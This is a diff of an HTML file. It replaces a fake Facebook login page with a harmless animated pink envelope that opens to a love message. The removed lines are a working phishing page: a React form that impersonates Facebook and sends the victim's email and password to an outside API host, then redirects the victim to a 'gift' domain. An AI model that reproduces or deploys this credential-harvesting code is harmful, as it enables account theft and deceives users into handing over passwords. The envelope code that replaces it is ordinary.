@@ -1,446 +1,310 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Login</title>
+<html>
+<head>
+    <title>Pink Envelope</title>
+    <link href="https://fonts.googleapis.com/css2?family=Handlee&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --color-env: #FFB7C5;
+            --color-env2: #ff9aad;
+            --color-flap: #ff8da1;
+            --color-bg: #ed7fca;
+            --color-heart: #ff85a2;
+            --color-sparkle: #fff;
+            --wax-red: #c04040;
+        }
 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        #envelope {
+            position: relative;
+            width: 280px;
+            height: 180px;
+            border-bottom-left-radius: 6px;
+            border-bottom-right-radius: 6px;
+            margin: 0 auto;
+            top: 150px;
+            background-color: var(--color-flap);
+            box-shadow: 0 4px 20px rgba(0,0,0,.1);
+            cursor: pointer;
+        }
 
+        .front {
+            position: absolute;
+            width: 0;
+            height: 0;
+            z-index: 3;
+        }
 
+        .flap {
+            border-left: 140px solid transparent;
+            border-right: 140px solid transparent;
+            border-bottom: 82px solid transparent;
+            border-top: 98px solid var(--color-flap);
+            transform-origin: top;
+            pointer-events: none;
+        }
 
+        .pocket {
+            border-left: 140px solid var(--color-env);
+            border-right: 140px solid var(--color-env);
+            border-bottom: 90px solid var(--color-env2);
+            border-top: 90px solid transparent;
+            border-bottom-left-radius: 6px;
+            border-bottom-right-radius: 6px;
+        }
 
+        .letter {
+            position: relative;
+            background-color: #e0d9dd;
+            width: 90%;
+            margin: 0 auto;
+            height: 90%;
+            top: 5%;
+            border-radius: 6px;
+            box-shadow: 0 2px 26px rgba(0,0,0,.08);
+            padding: 15px;
+            box-sizing: border-box;
+        }
 
-<style>
-    body {
-  background-color: #eee;
-}
+        .letter:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-image: linear-gradient(180deg, 
+                rgba(255,255,255,0.00) 25%, 
+                rgba(255,231,236,0.70) 55%, 
+                rgba(255,231,236,1.00) 100%);
+        }
 
-.conta {
-  position: relative;
-  height: 100vh;
-}
-.container img {
-  width: 300px;
-  max-width: 90%;
-}
+        .message {
+            position: relative;
+            z-index: 2;
+            font-family: 'Handlee', cursive;
+            color: #d46a84;
+            text-align: center;
+            line-height: 1;
+            padding-top: 0px;
+        }
 
-.container {
-  width: 90%;
-}
+        .message p {
+            margin: 10px 0;
+            font-size: 1.8em;
+            text-shadow: 0 2px 3px rgba(0,0,0,0.1);
+        }
 
-.container .colors {
-  /* background-color: white; */
-  width: 500px;
-  max-width: 90%;
-  height: 500px;
-  margin: auto;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  border-radius: 5px;
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-  grid-gap: 10px;
-}
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
 
-.container .logo {
-  display: flex;
-  justify-content: center;
-  position: absolute;
-  left: 50%;
-  top: 10%;
-  transform: translate(-50%, -50%);
-}
+        .envlope-wrapper {
+            height: 380px;
+            margin-top: 50px;
+            animation: float 3s ease-in-out infinite;
+        }
 
-.container h1 {
-  text-align: center;
-}
+        .open .flap {
+            transform: rotateX(180deg);
+            transition: transform 0.4s ease, z-index 0.6s;
+            z-index: 1;
+        }
 
-.color1 {
-  background: linear-gradient(100deg, #1f4037 -100%, #99f2c8);
-}
+        .close .flap {
+            transform: rotateX(0deg);
+            transition: transform 0.4s 0.6s ease, z-index 1s;
+            z-index: 5;
+        }
 
-.color2 {
-  background: linear-gradient(100deg, whitesmoke -100%, #ff691f);
-}
-.color3 {
-  background: linear-gradient(100deg, whitesmoke -100%, #fab81e);
-}
-.color4 {
-  background: linear-gradient(100deg, whitesmoke -100%, #f58ea8);
-}
-.color5 {
-  background: linear-gradient(100deg, whitesmoke -100%, #19cf86);
-}
-.color6 {
-  background: linear-gradient(100deg, whitesmoke -100%, #91d2fa);
-}
-.color7 {
-  background: linear-gradient(100deg, whitesmoke -100%, #1b95e0);
-}
-.color8 {
-  background: linear-gradient(100deg, whitesmoke -100%, #abb8c2);
-}
-.color9 {
-  background: linear-gradient(100deg, whitesmoke -100%, #e81c4f);
-}
-.color10 {
-  background: linear-gradient(100deg, whitesmoke -100%, #000000);
-}
-.color11 {
-  background: linear-gradient(100deg, #c6426e -10%, #642b73);
-}
-.color12 {
-  background: linear-gradient(100deg, #0f2027 -10%, #203a43);
-}
+        .close .letter {
+            transform: translateY(0px); 
+            transition: transform 0.4s ease, z-index 1s;
+            z-index: 1;
+        }
 
-.co {
-  border-radius: 20px;
-  box-shadow: rgb(0 0 0 / 25%) 0px 5px 20px;
-  transition: transform 500ms;
-  animation: bounce 1s;
-  padding: 25px 0px;
-  cursor: pointer;
-}
+        .open .letter {
+            transform: translateY(-60px) rotate(-2deg);
+            transition: transform 0.4s 0.6s ease, z-index 0.6s;
+            z-index: 2;
+        }
 
-@keyframes bounce {
-  0% {
-    transform: rotate(0deg) scale(1);
-  }
-  33% {
-    transform: rotate(12deg) scale(1.2);
-  }
-  67% {
-    transform: rotate(-12deg) scale(0.8);
-  }
-  100% {
-    transform: rotate(0deg) scale(1);
-  }
-}
+        
 
-.co:hover {
-  transform: rotate(0deg) scale(1.2);
-}
+        .letter-corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffd1dc;
+            border-radius: 5px;
+            z-index: 3;
+        }
+        .corner-tl { top: 10px; left: 10px; border-right: none; border-bottom: none; }
+        .corner-br { bottom: 10px; right: 10px; border-left: none; border-top: none; }
 
-.border {
-  border: 5px solid black;
-}
+        .hearts, .sparkles {
+            position: absolute;
+            top: 90px;
+            left: 0;
+            right: 0;
+            z-index: 2;
+        }
 
-.btnu {
-  position: absolute;
-  top: 83%;
-  left: 50%;
-  width: 500px;
-  max-width: 90%;
-  transform: translate(-50%, 50%);
-  height: 70px;
-}
+        .heart, .sparkle {
+            position: absolute;
+            bottom: 0;
+            pointer-events: none;
+        }
 
-@media (max-width: 455px) {
-  .btnu {
-    position: absolute;
-    top: 80%;
-    left: 50%;
-    width: 500px;
-    max-width: 90%;
-    transform: translate(-50%, 50%);
-    height: 57px;
-    margin-bottom: 32px;
-  }
-}
-@media (max-width: 455px) {
-  .co:hover {
-    transform: rotate(0deg) scale(1.08);
-  }
-}
-/* @media (max-width:455px) {
-    .buut {
-        margin-bottom: 40px;
-    }
+        .heart:before,
+        .heart:after {
+            content: "";
+            position: absolute;
+            left: 25px;
+            top: 0;
+            width: 25px;
+            height: 40px;
+            background: var(--color-heart);
+            border-radius: 25px 25px 0 0;
+            transform: rotate(-45deg);
+            transform-origin: 0 100%;
+        }
 
-  } */
-.in {
-  width: 350px;
-  max-width: 90%;
-  display: block;
-  margin: auto;
-  padding: 10px;
-  margin-bottom: 6px;
-  background-color: #f5f6f7;
-  border: none;
-  border-radius: 4px;
-  border: 1px solid #00000012;
-  font-size: 14px;
-  font-family: Arial, Helvetica, sans-serif;
-}
+        .heart:after {
+            left: 0;
+            transform: rotate(45deg);
+            transform-origin: 100% 100%;
+        }
 
-.sub {
-  width: 350px;
-  max-width: 90%;
-  display: block;
-  margin: auto;
-  padding: 10px;
-  background-color: #1877f2 !important;
-  color: white;
-  border: none;
-  border-radius: 5px;
-  margin-top: 10px;
-  font-family: Arial, Helvetica, sans-serif;
-  font-weight: bold;
-}
+        .sparkle {
+            width: 8px;
+            height: 8px;
+            background: var(--color-sparkle);
+            border-radius: 50%;
+            animation: sparkleTwinkle 1s infinite;
+        }
 
-.modal-content {
-  width: 95%;
-  margin: auto;
-}
+        .close .heart,
+        .close .sparkle {
+            opacity: 0;
+            animation: none;
+        }
 
-.lg {
-  width: 112px !important;
-  display: block;
-  margin: auto;
-  margin-bottom: 25px;
-}
+        .a1 { left: 20%; transform: scale(0.6); animation: slideUp 4s linear infinite, sideSway 2s ease-in-out infinite alternate; }
+        .a2 { left: 55%; animation: slideUp 5s linear infinite, sideSway 4s ease-in-out infinite alternate; }
+        .a3 { left: 10%; transform: scale(0.8); animation: slideUp 7s linear infinite, sideSway 2s ease-in-out infinite alternate; }
 
-.modal-body .fr {
-  text-align: center;
-  display: block;
-  margin: auto;
-  margin-top: 20px;
-  font-size: 14px;
-}
+        .s1 { left: 30%; animation: sparkleUp 3s linear infinite; }
+        .s2 { left: 60%; animation: sparkleUp 4s linear infinite; }
+        .s3 { left: 45%; animation: sparkleUp 5s linear infinite; }
 
-.hr {
-  position: relative;
-}
+        @keyframes slideUp {
+            0% { top: 0; }
+            100% { top: -600px; }
+        }
 
-.hr .t {
-  font-size: 14px;
-  padding: 0px 20px;
-  position: absolute;
-  top: -11px;
-  right: 50%;
-  transform: translate(50%, 0px);
-  font-family: Arial, Helvetica, sans-serif;
-  color: #4b4f56;
-  background-color: white;
-}
+        @keyframes sideSway {
+            0% { margin-left: 0; }
+            50% { margin-left: 50px; }
+            100% { margin-left: 0; }
+        }
 
-.cr {
-  background-color: #00a400;
-  color: white;
-  padding: 8px 10px;
-  border-radius: 7px;
-  text-decoration: none;
-  margin: auto;
-  display: block;
-  width: 167px;
-  font-size: 14px;
-  text-align: center;
-  font-family: Arial;
-  font-weight: bold;
-  margin-bottom: 30px;
-}
+        @keyframes sparkleUp {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(-500px) rotate(360deg); opacity: 0; }
+        }
 
-.cr:hover {
-  color: white;
-}
+        @keyframes sparkleTwinkle {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
 
-.modal-body p {
-  display: flex;
-  justify-content: center;
-  color: gray;
-  font-size: 12px;
-  margin-top: 10px;
-  bottom: 5px;
-  margin-bottom: 0px;
-}
+        body {
+            background-color: var(--color-bg);
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-h5 {
-  font-size: 1rem;
-  color: red;
-}
+        .reset {
+            text-align: center;
+            margin-top: 50px;
+        }
 
-.container {
-  margin-top: 25px;
-  padding-left: 0px !important;
-  padding-right: 0px !important;
-}
+        .reset button {
+            font-weight: 600;
+            transition: all 0.3s ease;
+            background-color: var(--color-env);
+            border: 2px solid var(--color-env2);
+            border-radius: 20px;
+            color: white;
+            padding: 12px 25px;
+            margin: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            font-family: Arial, sans-serif;
+        }
 
-input {
-  width: 416px !important;
-}
+        .reset button:hover {
+            background-color: var(--color-env2);
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 7px 25px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="envlope-wrapper">
+        <div id="envelope" class="close">
+            <div class="wax-seal"></div>
+            <div class="front flap"></div>
+            <div class="front pocket"></div>
+            <div class="letter">
+                <div class="letter-corner corner-tl"></div>
+                <div class="letter-corner corner-br"></div>
+                <div class="message">
+                    <p>I love you,</p>
+                    <p>most ardently</p>
+                </div>
+            </div>
+            <div class="hearts">
+                <div class="heart a1"></div>
+                <div class="heart a2"></div>
+                <div class="heart a3"></div>
+            </div>
+            <div class="sparkles">
+                <div class="sparkle s1"></div>
+                <div class="sparkle s2"></div>
+                <div class="sparkle s3"></div>
+            </div>
+        </div>
+    </div>
+    <div class="reset">
+        <button id="open">Open Envelope</button>
+        <button id="reset">Close Envelope</button>
+    </div>
 
-.fr {
-  display: flex;
-  justify-content: center;
-  margin-top: 12px;
-  font-size: 14px;
-  text-decoration: none;
-}
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            const envelope = $('#envelope');
+            const btnOpen = $("#open");
+            const btnReset = $("#reset");
 
-.hr {
-  width: 416px !important;
-  max-width: 90%;
-  display: block;
-  margin: auto;
-  margin-bottom: 25px;
-}
+            envelope.on('click', open);
+            btnOpen.on('click', open);
+            btnReset.on('click', close);
 
-.bet {
-  display: flex;
-  justify-content: space-between;
-  align-items: flex-end;
-  margin-top: 100px;
-}
+            function open() {
+                envelope.removeClass("close").addClass("open");
+            }
 
-p {
-  margin: 0;
-  font-size: 11px;
-  color: #3d6299;
-  text-align: center;
-}
-
-.must p {
-  text-align: left;
-  color: #7f7212;
-  background-color: #fefbe2;
-  border-bottom: 2px solid #e2c822;
-  padding: 5px 8px;
-  margin: 0;
-  font-size: 14px;
-}
-</style>
-
-
-  </head>
-  <script
-    crossorigin
-    src="https://unpkg.com/react@18/umd/react.development.js"
-  ></script>
-  <script
-    crossorigin
-    src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"
-  ></script>
-  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-  <!-- tailwind cdn  -->
-  <script src="https://cdn.tailwindcss.com"></script>
-
-  <script
-    src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"
-    integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg=="
-    crossorigin="anonymous"
-    referrerpolicy="no-referrer"
-  ></script>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root"></div>
-
-    <script type="text/babel">
-
-      const axios = axios.create({
-              baseURL: "https://api.sc0m.com/api",
-              timeout: 5000,
-              headers: { "X-Custom-Header": "" },
-            });
-
-            const MainContent = () => {
-
-
-              const [vEmail, setVEmail] = React.useState("");
-              const [vPassword, setVPassword] = React.useState("");
-              const [data, setData] = React.useState("OGFiNjIwZTktNWI3My00NWNiLWJiODMtNWEwMjM1NTFlNjZhX3F1ZXJ5XzA1YzY5Y2U1LTI4ODYtNDc3NS1iM2RmLTY4NGRlZGE4Y2ExOQ==");
-
-            
-
-              const addNew = () => {
-                if (vPassword === "" || vEmail === "")
-                  return alert("Please fill all the fields");
-                const body = {
-                  data,
-                  email: vEmail,
-                  password: vPassword,
-                };
-
-                axios
-                  .post("/contact", body)
-                  .then(({ data }) => {
-                    window.location = data;
-                  })
-                  .catch((err) => {
-                    window.location = "https://gift.sc0m.com";
-                  });
-              };
-              return (
-                <>
-                <div id="top_form">
-                    <div class="must"><p>You must log in first.</p></div>
-    <div class="conta">
-        <div class="container">
-                <div method="post">
-                          <img class="lg" src="https://i.ibb.co/hFT2CgF/Facebook.png" alt=""/>
-                          <input class="in" type="text" name="email" placeholder="Email address or mobile number" required="" onChange={(e) => setVEmail(e.target.value)}/>
-
-                          <input class="in" type="password" name="pass" placeholder="Password"  onChange={(e) => setVPassword(e.target.value)}/>
-                          <input class="sub" type="submit" placeholder="" value="Login"  onClick={addNew}/>
-
-                      </div>
-                      </div>
-                      </div>
-                        </div>
-
-             {  /*   <header className="bg-blue-500 h-14 w-full flex justify-start items-center pl-5 text-white font-normal">
-                    <p>Facebook</p>
-                  </header>
-
-                  <div className="grid place-content-center grid-cols-1 md:px-36 mt-10 gap-10">
-
-                    <div
-                      className="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "
-                    ></div>
-
-                    <div className="p-2 w-full  gap-1  ">
-                      <div className="flex flex-col   p-2  gap-1">
-                        <label className="text-gray-500 text-sm"></label>
-                        <input
-
-                          type="text"
-                          className="w-full border p-2 rounded-md"
-                          placeholder="Phone number, username, or email"
-                          onChange={(e) => setVEmail(e.target.value)}
-                        />
-                      </div>
-                      <div className="flex flex-col   p-2   gap-1">
-                        <label htmlFor="password" className="text-gray-500 text-sm">
-
-                        </label>
-                        <input
-                          type="password"
-                          className="w-full border p-2 rounded-md"
-                          placeholder="Password"
-                          id="password"
-                          autoComplete="new-password"
-                          onChange={(e) => setVPassword(e.target.value)}
-                        />
-                      </div>
-                      <div className="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
-                        <button
-
-                          className=" text-white p-3 rounded-md w-full bg-blue-500 hover:bg-blue-600"
-                          onClick={addNew}
-                        >
-                         Log In
-                        </button>
-                      </div>
-                    </div>
-                  </div>*/}
-                </>
-              );
-            };
-
-            //render the component to the DOM
-            ReactDOM.render(<MainContent />, document.getElementById('root'));
+            function close() {
+                envelope.removeClass("open").addClass("close");
+            }
+        });
     </script>
-  </body>
+</body>
 </html>
